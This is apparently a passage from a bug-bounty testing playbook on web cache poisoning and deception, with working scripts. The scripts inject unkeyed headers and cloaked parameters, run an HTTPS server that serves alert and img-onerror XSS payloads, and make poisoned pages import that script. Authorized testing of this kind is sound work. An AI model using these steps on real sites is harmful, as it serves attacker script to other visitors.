# CCH · Web cache poisoning & cache deception

> A shared cache stores each response under a key built from part of the request. Poisoning is an input the key
> leaves out (a header, a cookie, an excluded or cloaked parameter, a GET body) changing the response that the cache
> then hands to everyone who asks for that key; deception is a static-looking URL that reaches a private page, so
> one signed-in user's copy is stored for anyone to read. It pays when the stored response runs our script for every
> visitor, holds a victim's personal data or tokens, or (only where the policy allows availability testing) replaces
> a page or its scripts with an error; a reflected header that no clean client receives is not a finding.

| | |
|---|---|
| **Class** | `cache` |
| **Applies when** | http, cache\|cdn |
| **Pays** | 48 disclosed reports filed under the class and 18 more that touch it; 11 paid, median $550, top $9,700. The four largest bounties are cache-poisoned denial of service, an error stored for script files or pages (#622122, $9,700; #1695604, $3,800; #1096609, $2,900; #409370, $2,500). Cache deception of personal data and CSRF tokens paid $800 and $400 (#1271944, #1530066); an `X-Forwarded-Host` reflected into a cached page paid $1,000 (#977851, filed under XSS); request smuggling into a cached redirect paid $18,900 and, for its bypass, $20,000 (#488147, #510152, filed under smuggling). |
| **Weaknesses** | Cache Poisoning · CWE-349 · Use of Cache Containing Sensitive Information · CWE-524 · Cross-site Scripting (XSS) - Stored · CWE-79 |

## Why it pays

Almost every large site sits behind a CDN or a caching proxy, and the cache and the application read the same
request differently. The cache builds its key from the method, host, path and query; the application reads the
whole request: forwarding headers the edge passes through (`X-Forwarded-Host`), cookies, the parameters the cache was
told to ignore (`utm_*`) and the body. Wherever the two disagree, one request writes the response the next visitor
reads, and the bug is worth what that audience is worth: every visitor of a page, or every page that loads a
poisoned script. On paths the same disagreement gives cache deception: the cache stores by extension or directory
(`.css`, `/static/`) while the application ignores a trailing segment, stops at a delimiter (`;` in Java servlet
containers) or resolves an encoded `..%2f`.

The money has gone mostly to availability. Of the 48 reports filed under the class, 18 are titled as denial of
service or as a page made inaccessible, and they hold the four largest bounties (#622122, #1695604, #1096609,
#409370). Twelve are titled as cache
deception, three of them paid ($800, $400 and $150: #1271944, #1530066, #593712). The stored-XSS outcomes were filed
under XSS (#977851, $1,000; #303730, $750). Request smuggling into a cached redirect paid more than anything else
near the class (#488147, $18,900; its bypass #510152, $20,000) and belongs to the SMG chapter. Ratings in the class:
17 medium, 12 high, 6 low, 13 unrated; 4 closed informative, 2 duplicate, 1 N/A. Most programmes exclude denial of
service, so on a typical engagement the paid outcomes are stored XSS through a poisoned page and personal data or
tokens through deception.

The chapter has four parts. CCH-001, CCH-003 and CCH-004 find an input the key leaves out (a header or cookie, a
parameter, a URL spelling the cache folds), and CCH-002 turns any of them into script for every client. CCH-005 and
CCH-006 are cache deception through extension rules and through directory and file-name rules. CCH-007 and CCH-008
are caches inside the application, where a URL cache-buster gives no isolation. CCH-009 is cache-poisoned denial of
service, run only where the policy allows availability testing. Every test uses a cache-buster of its own and first
checks that the buster is part of the key, so no real visitor ever receives a poisoned response.

## The crux question

**Which parts of my request does the cache leave out of its key while the origin still uses them to build the
response, and which URLs does the cache file as static that the origin answers with a private page?**

## Applicability probe

Settle `cache` and `cdn` for each host name before opening any item.

```bash
mkdir -p "$E/recon/$H"; W=$(awk -v r="$RATE" 'BEGIN{w=1/r; printf "%.2f", (w<1?1:w)}')
DBG=( -H 'Pragma: akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-cacheable, akamai-x-get-cache-key' -H 'Fastly-Debug: 1' )
J=$(curl -sS "${HDR[@]}" "$T/" | grep -oE '<script[^>]+src="/[^/"][^"]*\.js' | head -1 | sed 's/.*src="//')   # the first same-origin script, if any
# 1. a static file, that script and the home page: twice with one new query, then once with another new query
for p in /favicon.ico /robots.txt ${J:+"$J"} /; do q="cchp$RANDOM"
  for u in "$T$p?$q=1" "$T$p?$q=1" "$T$p?${q}b=1"; do echo "== $u"
    curl -sS "${HDR[@]}" "${DBG[@]}" -o /dev/null -D- "$u" | tr -d '\r' | grep -iE '^(HTTP/|(server|via|age|date|x-cache[a-z-]*|cf-cache-status|cf-ray|x-served-by|x-amz-cf-pop|x-varnish|x-vercel-cache|x-nextjs-cache|x-drupal-cache|cache-status|cache-control|vary|x-check-cacheable|fastly-debug-ttl):)'
    sleep "$W"; done; done | tee "$E/recon/$H/cache-probe.txt"
dig +short CNAME "$H"
# 2. a cache inside the application prints no header: the same nonce, token or "generated" stamp for two different queries
for i in 1 2; do curl -sS "${HDR[@]}" "$T/?cchp$RANDOM=1" | grep -oiE '(nonce|csrf[-_]?token|authenticity_token)[^>]{0,60}|(generated|cached)[^<>]{0,60}' | head -3; echo --; sleep 3; done
```

Read step 1 per path. A hit marker (`HIT`, `Hit from cloudfront`, `TCP_HIT`, an `Age` above 0, two ids in
`X-Varnish`) on the second request and not on the third: a shared cache that keys on the query. A `Date` that does
not change between the first two requests is the same sign without any cache header. A hit on the first request of
a new query: the query is outside the key on that path; write it down, because every item then needs another
buster. The vendor: `CF-Ray` Cloudflare, `X-Served-By` or `Fastly-Debug-TTL` Fastly, `X-Amz-Cf-Pop` CloudFront,
`X-Check-Cacheable` or `X-Cache-Key` Akamai, `X-Varnish` or `Via: ... varnish` Varnish, and the CNAME. Step 2:
identical values for two different queries mean a cache inside the application that ignores the query; that counts
as `cache=1`, and URL busters will not isolate it (CCH-007).

```bash
scripts/sane fact set "$H" cache=1 cdn=1 --ev "CF-Ray; /favicon.ico?cchp...: CF-Cache-Status MISS, HIT, then MISS on a new query; / is DYNAMIC; Vary: Accept-Encoding"
scripts/sane fact set "$H" cache=1 --ev "no cache header, but / gave the same CSP nonce and 'generated' stamp for two different queries 3 s apart (application page cache)"
# nothing stored anywhere and no CDN in front:
scripts/sane fact set "$H" cache=0 cdn=0 --ev "favicon, robots.txt, the first script and / twice each: no Age or cache-status header, Date changes, no CDN header or CNAME, nonces differ"
```

With `cache` and `cdn` both false the chapter closes for the host and the planner writes the reason. With `cdn=1`
it stays open even when no path shows a hit: a CDN applies extension and directory rules to URLs it has never
stored before, which is what CCH-005 and CCH-006 test. The items' own facts come from other probes: `reflect` from
the fingerprint, `login` and `cookie-auth` from the AUT chapter's probe, `dos-ok` from the policy.

## Triage order

CCH-001 (a header and cookie sweep per host name; its isolation step settles CCH-007) → CCH-007 (only when
CCH-001's inert value appeared outside its own key) → CCH-005 (about 35 requests with one account; the best-paid
outcome that is not denial of service) → CCH-003 (where a parameter is reflected) → CCH-004 (a reflection that
browsers encode) → CCH-002 (as soon as CCH-001, CCH-003 or CCH-004 holds) → CCH-006 (after CCH-005, once the static
rules are known) → CCH-008 (application caches, two accounts, manual) → CCH-009 (only under `dos-ok`).

## Items

### CCH-001 · An unkeyed request header or cookie changes a cacheable response, and a clean client requesting the same busted URL receives the changed response from the cache

| | |
|---|---|
| **Severity** | Low standalone when our value is stored in the page's links or metadata; Medium when it is the `action` of a form visitors submit, or with RDR-010 when it builds a stored redirect; High with CCH-002 when it lands in a script or data import, or unencoded in the HTML |
| **Requires** | — |
| **Excluded by** | — |
| **Unit** | host |
| **Cost** | medium |
| **Weakness** | Cache Poisoning · CWE-349 |
| **Prior art** | #977851, #1760213, #1262408, #492841 |

- **Where:** every host name behind the cache, one at a time: the key and the headers the edge forwards differ per
  host. Aim at responses the applicability probe saw stored and that the application builds: the home page and
  locale roots, article, product and landing pages, error pages, and generated files (`/config.js`, `/env.js`,
  translation bundles, `manifest.json`, `sitemap.xml`). No fact beyond the chapter gate: any stored response can
  depend on a header the key leaves out, and steps 0 to 2 settle it in a few dozen requests.
- **Test:** the cache keys on method, host, path and query, plus the `Vary` headers it honours; forwarding headers,
  cookies and most other headers still reach the origin. When the origin builds the response from one of them
  (absolute URLs from `X-Forwarded-Host`, a redirect from `X-Forwarded-Scheme`, a route from `X-Original-URL`, a
  language from a cookie), the response one request produced is what the next client with the same key receives.
  Send each input on a URL with a fresh cache-buster, look for our value or a changed response, then request the
  same URL without the input and look for the change with a hit marker. A header named in `Vary` is tested like the
  rest: Cloudflare documents that it ignores `Vary` values other than `Accept-Encoding`.
- **How:** host overrides carry an inert value first: the host in capitals with the default port, which a browser
  turns back into the real host, so the value is harmless even if it reaches a response it should not.
  ```bash
  D="$E/evidence/$H/CCH-001"; mkdir -p "$D"; W=$(awk -v r="$RATE" 'BEGIN{w=1/r; printf "%.2f", (w<1?1:w)}')
  P="/"                                  # a page this host stores (the applicability probe: MISS, then HIT)
  hit(){ tr -d '\r' < "$1" | grep -qiE '^((cf-cache-status|x-cache|x-vercel-cache|x-nextjs-cache|x-drupal-cache|x-cache-status|cache-status): .*hit|age: *[1-9]|x-varnish: *[0-9]+ +[0-9]+)' && echo HIT || echo MISS; }
  get(){ local f=$1; shift; curl -sS "${HDR[@]}" -D "$f.h" -o "$f.b" "$@"; sleep "$W"; }
  sig(){ tr -d '\r' < "$1.h" | awk -v n="$(grep -c '' "$1.b")" 'NR==1{s=$2} tolower($1)=="content-type:"{t=$2} tolower($1)=="location:"{l=$2} END{print s, t, l, n " lines"}'; }
  C="${H^^}:443"                         # inert: a browser reads https://APP.EXAMPLE.COM:443/x as https://app.example.com/x
  mk(){ echo $(( $(grep -c -F "${H^^}" "$1") + $(grep -ci -F "$H:443" "$1") )); }
  # 0. the buster is part of the key: a new name misses, the same name hits, another new name misses
  k="cch001k$RANDOM"; get "$D/k1" "$T$P?$k=1"; get "$D/k2" "$T$P?$k=1"; get "$D/k3" "$T$P?${k}x=1"
  echo "$(hit "$D/k1.h") $(hit "$D/k2.h") $(hit "$D/k3.h") | baseline: $(sig "$D/k1") | inert value already on the page: $(mk "$D/k1.b")" | tee "$D/key.txt"
  # stop unless MISS HIT MISS: a HIT on k1 means the query is not keyed; three misses mean this path is not stored
  # 1. one fresh buster per header; host overrides carry the inert value, the others a value whose effect shows
  for hv in "X-Forwarded-Host: $C" "X-Host: $C" "X-Forwarded-Server: $C" "X-Original-Host: $C" "X-HTTP-Host-Override: $C" \
            "Forwarded: host=\"$C\"" "Host: $C" "X-Forwarded-Scheme: http" "X-Forwarded-Proto: http" "X-Forwarded-Port: 8443" \
            "X-Forwarded-Prefix: /cch001p" "X-Original-URL: /cch001-$RANDOM" "X-Rewrite-URL: /cch001-$RANDOM" \
            "Accept: application/json" "X-Requested-With: XMLHttpRequest" "RSC: 1"; do
    b="cch001$RANDOM"; get "$D/$b" -H "$hv" "$T$P?$b=1"
    printf '%-40s | %-48s | inert %s | ours %s | %s\n' "$hv" "$(sig "$D/$b")" "$(mk "$D/$b.b")" "$(grep -cE 'cch001p|:8443' "$D/$b.b")" "$b"
  done | tee "$D/headers.txt"
  b="cch001$RANDOM"; get "$D/$b" --http1.1 --request-target "https://$C$P?$b=1" "$T$P?$b=1"
  echo "absolute request line | $(sig "$D/$b") | inert $(mk "$D/$b.b") | $b" | tee -a "$D/headers.txt"
  # 2. cookies the host sets plus common preference names, the User-Agent with a suffix, and Referer, each with its own marker
  UA=$(printf '%s\n' "${HDR[@]}" | awk 'f{print; exit} $0=="-A"{f=1}')
  for c in $(tr -d '\r' < "$D/k1.h" | sed -n 's/^[Ss]et-[Cc]ookie: *\([^=]*\)=.*/\1/p' | sort -u) lang locale currency country region theme; do
    b="cch001$RANDOM"; get "$D/$b" -H "Cookie: $c=cch001c$b" "$T$P?$b=1"; echo "Cookie: $c | marker $(grep -c "cch001c$b" "$D/$b.b") | $b"
  done | tee "$D/inputs.txt"
  b="cch001$RANDOM"; get "$D/$b" -H "User-Agent: $UA cch001u" "$T$P?$b=1"; echo "User-Agent | marker $(grep -c cch001u "$D/$b.b") | $b" | tee -a "$D/inputs.txt"
  b="cch001$RANDOM"; get "$D/$b" -H "Referer: https://$H/cch001r" "$T$P?$b=1"; echo "Referer | marker $(grep -c cch001r "$D/$b.b") | $b" | tee -a "$D/inputs.txt"
  # 3. per changed row: the input on a fresh buster, the same URL from a clean client, a new buster without the input
  hv="X-Forwarded-Host: $C"              # the row under test, exactly as sent above
  b="cch001v$RANDOM"; get "$D/v1" -H "$hv" "$T$P?$b=1"; get "$D/v2" "$T$P?$b=1"; get "$D/v3" "$T$P?${b}x=1"
  for f in v1 v2 v3; do echo "$f $(hit "$D/$f.h") | $(sig "$D/$f") | inert $(mk "$D/$f.b")"; done | tee "$D/verdict.txt"
  # wanted: v1 changed, v2 the same change with HIT, v3 the baseline. The change on v3 means it outlived our key: CCH-007.
  # 4. host headers that showed nothing in step 1, once each with a host of ours, then a new buster as the control
  X="cch001.${OOB:-example.org}"
  for h in X-Forwarded-Host X-Host X-Forwarded-Server X-Original-Host; do b="cch001n$RANDOM"
    get "$D/$b" -H "$h: $X" "$T$P?$b=1"; get "$D/$b.iso" "$T$P?${b}x=1"
    echo "$h | ours $(grep -c -F "$X" "$D/$b.b") | new buster $(grep -c -F "$X" "$D/$b.iso.b")"
  done | tee "$D/hosts-ours.txt"
  ```
  Run step 3 for each row of steps 1 and 2 whose inert count, marker, status, type or `Location` differs from the
  baseline; for the absolute request line, step 3 takes the `--request-target` argument in place of `-H`. When `v3`
  shows no trace of the inert value (the entry is ours alone), repeat step 3 once for that header with `$X` in place
  of `$C`: a stored page with our host where the real one was is what the report shows. Step 4 exists because
  frameworks that lowercase the host and drop a default port (Symfony and Laravel do) hide the inert value; it runs
  only on keys step 0 proved isolated. A `new buster` count above zero in step 4 means our host is in
  a response that does not depend on our buster: stop all requests, note the time and the `Cache-Control`, and
  follow PB-14 (the target degraded).
- **Proof:** `key.txt` (MISS, HIT, MISS: our buster is a key of its own, so the real page was never touched) and the
  raw captures of step 3: `v1` with the input, `v2` without it on the same URL carrying the change with a hit
  marker, and `v3` on a new buster without it showing the normal page. Name the input, the cache (`Server`, `Via`,
  `CF-Ray`, `X-Served-By`, `X-Amz-Cf-Pop`), the lifetime (`Cache-Control` against `Age`) and where in the page the
  value lands. A triager repeats the three requests with a buster of their own.
- **Not a finding when:** `v2` shows the normal page or a miss: the input is in the key, the response is `private`
  or `no-store` or sets a cookie (Varnish's built-in configuration and Cloudflare do not store those), or the edge
  strips the header. A header reflected only into the response of the request that carried it is `host-header`:
  park it, and hand it to AUT-001 or HHI-001 when the same header writes e-mailed links. `v1` is already a hit: the
  input never reached the origin. The value lands only in `rel=canonical`, `og:url`, `hreflang` or a sitemap:
  closed as informative on most programmes. A cookie row that never stores: Varnish's built-in configuration
  passes every request that carries a cookie. The only change is a redirect from a scheme or port header to the
  same URL, an error, or a JSON or RSC body in place of the page: that is availability (CCH-009, under `dos-ok`).
  The marker in `v2` sits in a URL the page prints with our own query: that is the buster, not the input.
- **Escalate:** CCH-002 when the value is in a `<script src>`, a module, a JSON or config URL the page's script
  fetches, or unencoded markup. RDR-010 when it builds a stored `Location`. CCH-007 when `v3`, or any other buster
  or path, shows the inert value: an application cache keeps it. A path-override header that is honoured (step 1
  answered 404 for `X-Original-URL: /cch001-...`): point it at a page of the site that reflects a parameter
  (`X-Original-URL: /search?q=cch001x`) and run step 3; the cache stores that page under our URL and CCH-002 runs
  it. Only where the policy allows a live confirmation: once, the inert value `${H^^}:443` without the buster (never
  `$OOB` or a payload), one clean request to read it, then one request without the header carrying
  `Cache-Control: no-cache` (caches that honour a client reload refetch at once), and after `max-age` one clean
  response saved to show the page is back.

### CCH-002 · A poisoned cache entry runs our JavaScript in the target's origin for every client that loads it: an unencoded reflection, a script or data import from our host, or a stored redirect on a script URL

| | |
|---|---|
| **Severity** | Medium standalone when one stored page runs our script for every client of its key; High when the poisoned resource is a script or data file that other pages load, or with XSS-018 (takeover of our victim account) |
| **Requires** | browser |
| **Excluded by** | — |
| **Unit** | host |
| **Cost** | medium |
| **Weakness** | Cross-site Scripting (XSS) - Stored · CWE-79 |
| **Prior art** | #1795197, #303730, #1424094, #1621540 |

- **Where:** a primitive that already holds: CCH-001 (an unkeyed header or cookie), CCH-003 (an unkeyed, cloaked or
  body parameter), CCH-004 (a spelling the key folds). Four shapes pay: (a) the value is reflected unencoded into
  the stored HTML; (b) it builds the URL of a script the page loads (`<script src="https://<value>/static/app.js">`,
  a module, a script loader's base URL); (c) a script URL the site loads answers with a stored redirect to our host
  (#1795197 is titled as redirection on JS files through cache poisoning); (d) the page's own script fetches JSON
  or config from a URL built from the value and writes a field into the DOM (#303730 is titled as stored DOM XSS
  through cache poisoning). (b) to (d) need a host of ours that serves files over HTTPS (`$OOB` as our own server);
  with an interaction server alone, the clean browser's request for our file is the proof that the import is ours,
  and without any `$OOB` only (a) can run.
- **Test:** show that a client who never sent the input runs our JavaScript in the target's origin. The poisoned key
  is ours (a buster) and the browser that proves it loads that same busted URL, so no real visitor is involved.
  Poison with the browser itself: it sends its own `Accept`, `Accept-Encoding` and `User-Agent`, which pick the
  stored variant it is served.
- **How:**
  ```bash
  D="$E/evidence/$H/CCH-002"; mkdir -p "$D"; W=$(awk -v r="$RATE" 'BEGIN{w=1/r; printf "%.2f", (w<1?1:w)}')
  P="/"; HN="X-Forwarded-Host"          # the page and the unkeyed header CCH-001 proved; for CCH-003 and CCH-004 see below
  hit(){ tr -d '\r' < "$1" | grep -qiE '^((cf-cache-status|x-cache|x-vercel-cache|x-nextjs-cache|x-drupal-cache|x-cache-status|cache-status): .*hit|age: *[1-9]|x-varnish: *[0-9]+ +[0-9]+)' && echo HIT || echo MISS; }
  # 1. where the inert value landed in CCH-001's stored page, and what would refuse a file of ours
  grep -noE "<script[^>]*src=[\"'][^\"']*${H^^}[^\"']*|[\"']https?://${H^^}[^\"']*\.(js|mjs|json)|integrity=[\"'][^\"']+" "$E/evidence/$H/CCH-001/v2.b" | head -20
  tr -d '\r' < "$E/evidence/$H/CCH-001/v2.h" | grep -i '^content-security-policy'
  # 2. for (b) and (d), on the $OOB host (port 443 as root there, with a certificate for its name):
  cat > srv.py <<'PY'
  import http.server, ssl
  class H(http.server.BaseHTTPRequestHandler):
      def do_GET(self):
          js = self.path.split('?')[0].endswith(('.js', '.mjs'))
          body = b'alert(document.domain)//cch002' if js else b'{"cch002":"<img src=x onerror=alert(document.domain)>"}'
          self.send_response(200)
          self.send_header('Content-Type', 'application/javascript' if js else 'application/json')
          self.send_header('Access-Control-Allow-Origin', '*'); self.send_header('Content-Length', str(len(body)))
          self.end_headers(); self.wfile.write(body)
  s = http.server.HTTPServer(('0.0.0.0', 443), H)
  c = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER); c.load_cert_chain('fullchain.pem', 'privkey.pem')
  s.socket = c.wrap_socket(s.socket, server_side=True); s.serve_forever()
  PY
  python3 srv.py                         # for (d), edit the JSON body to the shape the page's script reads
  # 3. the buster is in the key on this page (MISS HIT MISS, or stop: a header sent here would reach real visitors),
  #    then raw evidence with curl: the header on a fresh buster, and the same URL from a clean client
  k="cch002k$RANDOM"; for q in "$k" "$k" "${k}x"; do curl -sS "${HDR[@]}" -o /dev/null -D "$D/k.h" "$T$P?$q=1"; printf '%s ' "$(hit "$D/k.h")"; sleep "$W"; done | tee "$D/key.txt"; echo
  b="cch002$RANDOM"
  curl -sS "${HDR[@]}" -H "$HN: $OOB" -D "$D/1.h" -o "$D/1.b" "$T$P?$b=1"; sleep "$W"
  curl -sS "${HDR[@]}" -D "$D/2.h" -o "$D/2.b" "$T$P?$b=1"; sleep "$W"
  echo "clean: $(hit "$D/2.h") | our host in the stored page: $(grep -c -F "$OOB" "$D/2.b")"; grep -oE "[^\"' ]*${OOB//./\\.}[^\"' ]*" "$D/2.b" | sort -u
  # 4. a browser poisons a new buster, then a second, clean browser context loads the same URL
  cat > "$D/fire.py" <<'PY'
  # fire.py <url> <dir> <user agent> <headers JSON> <poison> <marker>
  # poison: "Name: value" adds that header to a first visit; "url:<url>" makes the first visit to that URL; "-" skips it
  import json, sys
  from playwright.sync_api import sync_playwright
  url, out, ua, xh, poison, mark = sys.argv[1:7]
  hdrs, log = json.loads(xh), []
  with sync_playwright() as p:
      b = p.chromium.launch()
      if poison != '-':
          extra, first = dict(hdrs), url
          if poison.startswith('url:'):
              first = poison[4:]
          else:
              n, v = poison.split(': ', 1)
              extra[n] = v
          c1 = b.new_context(user_agent=ua, extra_http_headers=extra)
          c1.new_page().goto(first)
          c1.close()
      c2 = b.new_context(user_agent=ua, extra_http_headers=hdrs)
      pg = c2.new_page()
      pg.on('dialog', lambda d: (log.append('dialog: ' + d.message), d.dismiss()))
      pg.on('request', lambda rq: log.append('request: ' + rq.url) if mark in rq.url else None)
      r = pg.goto(url)
      pg.wait_for_timeout(4000)
      cache = {k: v for k, v in r.headers.items() if 'cache' in k or k == 'age'}
      log.append('clean visit: %s %s accept-encoding=%s' % (r.status, cache, r.request.all_headers().get('accept-encoding')))
      pg.screenshot(path=out + '/browser.png', full_page=True)
      b.close()
  open(out + '/browser.log', 'w').write('\n'.join(log) + '\n')
  print('\n'.join(log))
  PY
  UA=$(printf '%s\n' "${HDR[@]}" | awk 'f{print; exit} $0=="-A"{f=1}')
  XH=$(printf '%s\n' "${HDR[@]}" | awk 'f{print; f=0; next} $0=="-H"{f=1}' | python3 -c 'import json,sys; print(json.dumps(dict(l.rstrip("\n").split(": ", 1) for l in sys.stdin if ": " in l)))')
  python3 "$D/fire.py" "$T$P?cch002$RANDOM=1" "$D" "$UA" "$XH" "$HN: $OOB" "$OOB"
  # (a) an unencoded reflection: the payload for its context as the value, and cch002 as the marker, for example
  #   python3 "$D/fire.py" "$T$P?cch002$RANDOM=1" "$D" "$UA" "$XH" "$HN: x\"><img src=x onerror=alert(document.domain)>" cch002
  ```
  For a CCH-003 primitive the poison argument is `url:` followed by the URL that carries the hidden parameter, and
  the first argument is the clean URL with the same buster. For CCH-004 the raw spelling cannot come from a browser:
  poison with curl sending the `accept-encoding` that `browser.log` recorded for a clean visit, then run `fire.py`
  with `-` as the poison argument. A `Host` header set through a browser context is not sent by Chromium: poison
  that one with curl the same way. Shape (c) is shown with curl alone: the clean request for the busted script URL
  gets the stored 30x to our host.
- **Proof:** `key.txt` (the buster is a key of its own, so no real visitor received our host), then `2.h` and `2.b`:
  the clean curl request receiving the stored page with our host in the import (or the payload unencoded) and a hit
  marker. `browser.log` from the clean context: `dialog: <the target's host>` (the script ran in the target's
  origin; with an interaction server only, `request: https://<OOB>/...` from the clean visit) and `browser.png` with
  the URL. For (c): the clean request for the busted script URL answering a stored 30x to our host, raw, and the
  pages that load that script (`grep -rl` over the crawl); a browser adds nothing there, because the site's pages
  import the real script URL, which we never poison.
- **Not a finding when:** the stored page's `Content-Security-Policy` does not allow our host (`script-src 'self'`,
  a nonce or a hash): the import is refused and the console names the policy, which is XSS-015's ground. The
  `<script>` tag carries `integrity=`: a file with another hash does not run. The import is `http://` on an
  `https://` page: blocked as mixed content. The dialog shows our own host or `null`: the script ran in a page or
  frame of ours, not in the target's origin. Step 3 hits and step 4 shows nothing: the browser was served another
  variant of the key, which is why step 4 poisons with the browser itself; a miss there after a hit in step 3 is
  that mismatch, not a negative.
- **Escalate:** XSS-018 with the same delivery: our victim account B, signed in, loads the busted URL and the
  script completes the takeover route. Write the scale into the report from evidence, not by demonstration: which
  pages share the key or import the script, the lifetime (`max-age`), and that an attacker repeats the poisoning
  request each time the entry expires. Never send `$OOB` or a payload on the real, unbusted URL, even where the
  policy allows a live confirmation: that confirmation uses CCH-001's inert value only.

### CCH-003 · A query parameter the cache leaves out of its key, hides inside another parameter, or reads from a GET body reaches the origin and is reflected into the stored page

| | |
|---|---|
| **Severity** | Low standalone when our text or markup is stored and served to clean clients without running; Medium with CCH-002 when it runs on the stored page; High with CCH-002 when the stored response is a script or JSONP file that other pages load |
| **Requires** | reflect |
| **Excluded by** | — |
| **Unit** | host |
| **Cost** | medium |
| **Weakness** | Cache Poisoning · CWE-349 |
| **Prior art** | #3183046, #1011093 |

- **Where:** pages and generated scripts whose response reflects a query parameter (the `reflect` fact's evidence
  and the crawl in `$E/recon/$H/`): search and listing pages, pages that copy the full URL into canonical links,
  share buttons or analytics tags (where `utm_*` values land), and JSONP or configuration scripts (`?callback=`,
  `?jsonp=`, `?cb=`) that pages include. #3183046 is titled as cache pollution through unkeyed GET parameters.
- **Test:** three ways a parameter reaches the origin without reaching the key. Excluded parameters: caches are
  often configured to drop tracking parameters (`utm_*`, `gclid`, `fbclid`) from the key while still forwarding
  them. Cloaking: the cache splits the query on `&` only, while some origin parsers also split on `;` (Ruby's Rack
  2, Bottle, Python's `parse_qs` before the CVE-2021-23336 fix), so `utm_content=x;callback=evil` is one excluded
  parameter to the cache and a second `callback` to the origin. Fat GET: the key is the URL, and the origin also
  reads parameters from the body of a GET.
- **How:**
  ```bash
  D="$E/evidence/$H/CCH-003"; mkdir -p "$D"; W=$(awk -v r="$RATE" 'BEGIN{w=1/r; printf "%.2f", (w<1?1:w)}')
  P="/search"; R="q"                     # a stored page and the parameter it reflects; for a JSONP script: P=/api/geo.js R=callback
  hit(){ tr -d '\r' < "$1" | grep -qiE '^((cf-cache-status|x-cache|x-vercel-cache|x-nextjs-cache|x-drupal-cache|x-cache-status|cache-status): .*hit|age: *[1-9]|x-varnish: *[0-9]+ +[0-9]+)' && echo HIT || echo MISS; }
  get(){ local f=$1; shift; curl -sS "${HDR[@]}" -D "$f.h" -o "$f.b" "$@"; sleep "$W"; }
  # 0. the buster is in the key and R is reflected: MISS HIT MISS
  k="cch003k$RANDOM"; get "$D/k1" "$T$P?$k=1&$R=cch003a"; get "$D/k2" "$T$P?$k=1&$R=cch003a"; get "$D/k3" "$T$P?${k}x=1&$R=cch003a"
  echo "$(hit "$D/k1.h") $(hit "$D/k2.h") $(hit "$D/k3.h") | R reflected: $(grep -c cch003a "$D/k1.b")" | tee "$D/key.txt"
  # 1. parameters caches are often told to leave out of the key: each with a marker, then the busted URL without it
  for q in utm_source utm_medium utm_campaign utm_content utm_term gclid fbclid msclkid dclid mc_cid mc_eid _ga _gl ref _; do
    b="cch003$RANDOM"; get "$D/$b.1" "$T$P?$b=1&$q=cch003$q"; get "$D/$b.2" "$T$P?$b=1"
    echo "$q | with $(grep -c "cch003$q" "$D/$b.1.b") | clean $(grep -c "cch003$q" "$D/$b.2.b") $(hit "$D/$b.2.h") | $b"
  done | tee "$D/unkeyed.txt"
  # 2. cloaking: an unkeyed parameter U from step 1 carries a second R that the origin reads; the clean request asks for R=cch003a
  U=utm_content
  for form in "$R=cch003a&$U=x;$R=cch003b" "$R=cch003a&$U=x%3b$R=cch003b" "$R=cch003a&$R=cch003b"; do
    b="cch003$RANDOM"; get "$D/$b.1" "$T$P?$b=1&$form"; get "$D/$b.2" "$T$P?$b=1&$R=cch003a"
    echo "$form | with $(grep -o 'cch003[ab]' "$D/$b.1.b" | sort -u | tr '\n' ' ')| clean has b: $(grep -c cch003b "$D/$b.2.b") $(hit "$D/$b.2.h") | $b"
  done | tee "$D/cloak.txt"
  # 3. fat GET: R in the body of a GET whose URL asks for R=cch003a, as a form body and as JSON
  for ct in form json; do b="cch003$RANDOM"
    if [ "$ct" = form ]; then body="$R=cch003f"; type='application/x-www-form-urlencoded'; else body="{\"$R\":\"cch003f\"}"; type='application/json'; fi
    curl -sS "${HDR[@]}" -X GET -H "Content-Type: $type" --data-binary "$body" -D "$D/$b.1.h" -o "$D/$b.1.b" "$T$P?$b=1&$R=cch003a"; sleep "$W"
    get "$D/$b.2" "$T$P?$b=1&$R=cch003a"
    echo "fat GET $ct | with $(grep -o 'cch003[af]' "$D/$b.1.b" | sort -u | tr '\n' ' ')| clean has f: $(grep -c cch003f "$D/$b.2.b") $(hit "$D/$b.2.h") | $b"
  done | tee "$D/fatget.txt"
  ```
  Step 0 must read MISS HIT MISS with `cch003a` reflected. When `k1` is already a hit, the whole query is outside
  the key on this path: do not run steps 1 to 3 there, because each would write the page real visitors get. A
  finding is a row whose clean request (the URL a victim's link or page uses) carries our marker with a hit marker.
- **Proof:** `key.txt` and, for the row that holds, both raw responses: the request carrying the hidden value, and
  the clean request for the keyed URL (`?<buster>&R=cch003a`, or the bare busted URL for an excluded parameter)
  receiving `cch003b`, `cch003f` or the excluded parameter's marker with a hit marker.
- **Not a finding when:** the clean request misses or lacks the marker: the parameter is in the key, and what is
  left is ordinary reflected input (XSS chapter). `with` is 0 for an excluded parameter: the edge strips it before
  the origin. The body is ignored, or the edge refuses a GET with a body (CloudFront answers 403): the control
  holds. The marker comes back HTML-encoded: no markup, and text alone is `content-spoofing`. `k1` is a hit: record
  the unkeyed query `parked` with `key.txt`, and look for a path spelling the origin answers with the same page and
  the cache keys apart (`//`, `/./`, `/index.html`, `;cch003` on a Java server) to use as the buster after the same
  MISS HIT MISS check.
- **Escalate:** CCH-002 (a) with the payload in the same position: a `utm_content` value that leaves an attribute,
  or, for a stored JSONP script, a cloaked `callback=alert(document.domain)//` behind the callback name the site's
  pages request, which is our code in every page that includes the script (High; shown with curl on the busted
  script URL, as shape (c) of CCH-002). The live-confirmation rule of CCH-001 applies: an inert marker, once, only
  where the policy allows it.

### CCH-004 · The cache decodes the URL before keying it while the origin reflects the raw form, so a request only curl can send stores raw markup under the key a victim's browser uses

| | |
|---|---|
| **Severity** | None standalone (two spellings share one key); Medium with CCH-002 when a reflection that browsers encode reaches clean clients raw and runs; High with XSS-018 |
| **Requires** | reflect |
| **Excluded by** | — |
| **Unit** | host |
| **Cost** | low |
| **Weakness** | Cache Poisoning · CWE-349 |
| **Prior art** | #824753, #960618, #334709 |

- **Where:** reflections that are safe only because the browser encodes the input: a 404 or error page that prints
  the requested path (it counts as `reflect`, and XSS-005 found it not exploitable), a search page that prints `q`
  raw when it arrives raw. The response must be one the cache stores (a 404 the cache keeps, or a page whose
  `Cache-Control` allows it). Browsers percent-encode space, `"`, `<` and `>` in the path and the query, and `'` in
  the query of http and https URLs; curl with `--path-as-is` sends them as typed. #824753 is filed as cache
  poisoning through improper handling of URL encoding; #960618 is titled after upper-case letters in a path.
- **Test:** the origin reflects the bytes it receives: `%3Cx%3E` from a browser stays encoded, `<x>` from curl comes
